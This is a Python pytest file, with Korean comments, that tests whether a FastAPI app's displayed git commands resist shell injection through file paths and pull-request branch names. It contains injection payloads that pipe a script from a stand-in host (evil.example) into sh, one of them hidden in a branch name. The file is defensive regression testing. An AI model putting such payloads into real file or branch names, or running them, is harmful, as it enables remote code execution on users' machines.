"""화면에 보여 주는 git 명령에 파일·브랜치 이름으로 다른 명령을 끼워 넣지 못하는지."""

import pytest
from fastapi.testclient import TestClient

from app import main

client = TestClient(main.app)


@pytest.fixture(autouse=True)
def _fresh():
    main._demo.reset()
    main._EXECUTED.clear()
    yield

from app.demo import DemoGitHub
from app.state import build_state
from app.watch import watch


def _w(mutate=None):
    gh = DemoGitHub()
    if mutate:
        mutate(gh.d)
    st = build_state(gh)
    return {it["id"]: it for it in watch(st)}, st


# ---------- 화면에 보여 주는 git 명령에 파일·브랜치 이름으로 다른 명령을 끼워 넣지 못하게 ----------
EVIL = "x'; curl -s https://evil.example/p.sh | sh; echo '"


def _all_commands(items):
    return [h["command"] for it in items for h in (it.get("handoff") or []) if h and h.get("command")]


def _shell_ops(cmd):
    """셸이 명령을 끊는 기호(; | & 등) 중 '&&' 말고 따옴표 밖에 나온 것."""
    import shlex
    lx = shlex.shlex(cmd, posix=True, punctuation_chars=True)
    lx.whitespace_split = True
    return [t for t in lx if t and set(t) <= set(";|&()<>") and t != "&&"]


def _safe(cmd, name):
    return not _shell_ops(cmd) and name in cmd


def test_watch_commands_quote_secret_and_big_file_names():
    secret = f"config/{EVIL}.pem"
    big = f"data/{EVIL}.mp4"
    def evil(d):
        d["tree"].append({"path": secret, "type": "blob", "size": 100})
        d["tree"].append({"path": big, "type": "blob", "size": 30 * 1024 * 1024})
    w, _ = _w(evil)
    cmds = _all_commands([w["secret"], w["bigfile"]])
    assert cmds and all(_safe(c, "evil.example") for c in cmds if "evil" in c), cmds  # 고치기 전: git rm --cached 'config/x'; curl … | sh; …


def test_pr_branch_name_cannot_inject_command():
    bad = "fix;curl${IFS}https://evil.example/p.sh|sh"  # git 브랜치 이름에는 ; | $ 를 쓸 수 있다 (공개 저장소면 외부 PR도)
    def evil(d):
        for p in d["prs"]:
            p["head"]["ref"] = bad
    gh = DemoGitHub()
    evil(gh.d)
    st = build_state(gh)
    from app.triage import triage
    cmds = [c for c in _all_commands(watch(st) + triage(st, 24)) if "evil" in c]
    assert cmds, "브랜치 받기 명령이 없음"
    for c in cmds:
        assert not _shell_ops(c), c  # 브랜치 이름 속 ; | 가 명령을 끊지 않는다
